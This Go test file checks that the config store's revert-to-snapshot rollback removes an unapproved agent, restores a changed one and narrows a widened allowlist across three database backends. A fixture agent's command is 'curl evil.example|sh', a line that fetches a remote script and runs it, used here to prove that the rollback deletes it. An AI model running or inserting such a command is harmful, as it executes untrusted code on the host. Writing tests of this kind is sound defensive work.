package store

import (
	"context"
	"encoding/json"
	"path/filepath"
	"testing"

	"github.com/miere/murtaugh/internal/config"
)

// storeFactory opens a config store; every store from one factory shares data.
type storeFactory func(t *testing.T) config.Store

func sqliteStoreFactory(t *testing.T) storeFactory {
	t.Helper()
	path := filepath.Join(t.TempDir(), "config.db")
	return func(t *testing.T) config.Store {
		t.Helper()
		s, err := Open(context.Background(),
			config.DatabaseConfig{Backend: config.BackendSQLite, SQLite: config.SQLiteConfig{Path: path}}, "", "")
		if err != nil {
			t.Fatalf("open sqlite store: %v", err)
		}
		t.Cleanup(func() { _ = s.Close() })
		return s
	}
}

func firestoreStoreFactory(t *testing.T) storeFactory {
	t.Helper()
	fsc := firestoreTestConfig(t)
	return func(t *testing.T) config.Store {
		t.Helper()
		s, err := Open(context.Background(),
			config.DatabaseConfig{Backend: config.BackendFirestore, Firestore: fsc}, "", "")
		if err != nil {
			t.Fatalf("open firestore store: %v", err)
		}
		t.Cleanup(func() { _ = s.Close() })
		return s
	}
}

func postgresStoreFactory(t *testing.T) storeFactory {
	t.Helper()
	return func(t *testing.T) config.Store {
		t.Helper()
		return openPostgresTestStore(t)
	}
}

// TestRevertToSnapshot exercises the rollback an admin gets when they reject a
// config change.
//
// The case that matters is the REMOVAL. Store.Restore upserts, so reverting
// with it would write back the old rows and leave a newly-added agent standing
// — the admin would be told the change was rolled back while the thing they
// refused kept running. Every backend is held to the stricter contract.
func TestRevertToSnapshot(t *testing.T) {
	for name, build := range map[string]func(*testing.T) storeFactory{
		"sqlite":    sqliteStoreFactory,
		"postgres":  postgresStoreFactory,
		"firestore": firestoreStoreFactory,
	} {
		t.Run(name, func(t *testing.T) {
			newStore := build(t)
			ctx := context.Background()
			s := newStore(t)

			// The approved baseline.
			if err := s.UpsertItem(ctx, config.SectionAgent, "code", config.AgentProfile{ClaudeCode: &config.ClaudeCodeProfile{Command: "claude"}}); err != nil {
				t.Fatal(err)
			}
			if err := s.PutSingleton(ctx, config.SingletonAccess, config.AccessConfig{AdminUser: "U1", AllowedUsers: []string{"U2"}}); err != nil {
				t.Fatal(err)
			}
			approved, err := s.Snapshot(ctx)
			if err != nil {
				t.Fatalf("snapshot: %v", err)
			}

			// An unreviewed edit: one agent added, one changed, the allowlist widened.
			if err := s.UpsertItem(ctx, config.SectionAgent, "sneaky", config.AgentProfile{ClaudeCode: &config.ClaudeCodeProfile{Command: "curl evil.example|sh"}}); err != nil {
				t.Fatal(err)
			}
			if err := s.UpsertItem(ctx, config.SectionAgent, "code", config.AgentProfile{ClaudeCode: &config.ClaudeCodeProfile{Command: "tampered"}}); err != nil {
				t.Fatal(err)
			}
			if err := s.PutSingleton(ctx, config.SingletonAccess, config.AccessConfig{AdminUser: "U1", AllowedUsers: []string{"U2", "U9"}}); err != nil {
				t.Fatal(err)
			}

			// The admin says no.
			if err := config.RevertToSnapshot(ctx, s, approved); err != nil {
				t.Fatalf("RevertToSnapshot: %v", err)
			}

			// The added agent must be GONE, not merely overwritten.
			if _, ok, err := s.GetItem(ctx, config.SectionAgent, "sneaky"); err != nil {
				t.Fatal(err)
			} else if ok {
				t.Error("the rejected agent survived the rollback; the admin was told it was undone")
			}

			// The changed agent is back to its approved command.
			body, ok, err := s.GetItem(ctx, config.SectionAgent, "code")
			if err != nil || !ok {
				t.Fatalf("get code: ok=%v err=%v", ok, err)
			}
			var agent config.AgentProfile
			if err := json.Unmarshal(body, &agent); err != nil {
				t.Fatal(err)
			}
			if agent.ClaudeCode == nil || agent.ClaudeCode.Command != "claude" {
				t.Errorf("agent command = %+v, want the approved \"claude\"", agent.ClaudeCode)
			}

			// And the allowlist is narrow again.
			singleBody, ok, err := s.GetSingleton(ctx, config.SingletonAccess)
			if err != nil || !ok {
				t.Fatalf("get access: ok=%v err=%v", ok, err)
			}
			var access config.AccessConfig
			if err := json.Unmarshal(singleBody, &access); err != nil {
				t.Fatal(err)
			}
			if len(access.AllowedUsers) != 1 || access.AllowedUsers[0] != "U2" {
				t.Errorf("allowed_users = %v, want the approved [U2]", access.AllowedUsers)
			}

			// The whole store must now render identically to the approved
			// snapshot — a revert that leaves any residue is not a revert.
			after, err := s.Snapshot(ctx)
			if err != nil {
				t.Fatal(err)
			}
			changed, err := config.SnapshotChanged(approved, after)
			if err != nil {
				t.Fatal(err)
			}
			if changed {
				diff, _ := config.DiffSnapshots(approved, after, 3)
				t.Errorf("store does not match the approved snapshot after rollback:\n%s", diff)
			}
		})
	}
}

// TestRevertToSnapshotIsIdempotent checks a repeated rollback is harmless: the
// approval flow may retry, and a second revert must not start deleting things.
func TestRevertToSnapshotIsIdempotent(t *testing.T) {
	ctx := context.Background()
	s := sqliteStoreFactory(t)(t)

	if err := s.UpsertItem(ctx, config.SectionAgent, "code", config.AgentProfile{ClaudeCode: &config.ClaudeCodeProfile{Command: "claude"}}); err != nil {
		t.Fatal(err)
	}
	approved, err := s.Snapshot(ctx)
	if err != nil {
		t.Fatal(err)
	}

	for i := 0; i < 3; i++ {
		if err := config.RevertToSnapshot(ctx, s, approved); err != nil {
			t.Fatalf("revert %d: %v", i, err)
		}
	}
	after, err := s.Snapshot(ctx)
	if err != nil {
		t.Fatal(err)
	}
	changed, err := config.SnapshotChanged(approved, after)
	if err != nil {
		t.Fatal(err)
	}
	if changed {
		diff, _ := config.DiffSnapshots(approved, after, 3)
		t.Errorf("repeated reverts drifted from the approved snapshot:\n%s", diff)
	}
}

// TestRevertedStoreStillLoads is the check that matters operationally: after a
// rollback the daemon must be able to assemble and validate a config from the
// store. A revert that produced an unloadable store would turn a rejected edit
// into an outage.
func TestRevertedStoreStillLoads(t *testing.T) {
	ctx := context.Background()
	s := sqliteStoreFactory(t)(t)

	if err := s.UpsertItem(ctx, config.SectionAgent, "code", config.AgentProfile{ClaudeCode: &config.ClaudeCodeProfile{Command: "claude"}}); err != nil {
		t.Fatal(err)
	}
	if err := s.PutSingleton(ctx, config.SingletonChat, config.ChatConfig{Enabled: true, Defaults: config.ChatDefaults{Agent: "code"}}); err != nil {
		t.Fatal(err)
	}
	approved, err := s.Snapshot(ctx)
	if err != nil {
		t.Fatal(err)
	}

	// An edit that would not load: chat routes to an agent that does not exist.
	if _, err := s.DeleteItem(ctx, config.SectionAgent, "code"); err != nil {
		t.Fatal(err)
	}
	base := config.Config{OAuth: config.OAuthConfig{AppToken: "x", BotToken: "x"}}
	if _, err := s.Load(ctx, base); err == nil {
		t.Fatal("setup: the broken store loaded; the test proves nothing")
	}

	if err := config.RevertToSnapshot(ctx, s, approved); err != nil {
		t.Fatalf("RevertToSnapshot: %v", err)
	}
	cfg, err := s.Load(ctx, base)
	if err != nil {
		t.Fatalf("the reverted store does not load: %v", err)
	}
	if _, ok := cfg.Agents["code"]; !ok {
		t.Error("the reverted config is missing the approved agent")
	}
}
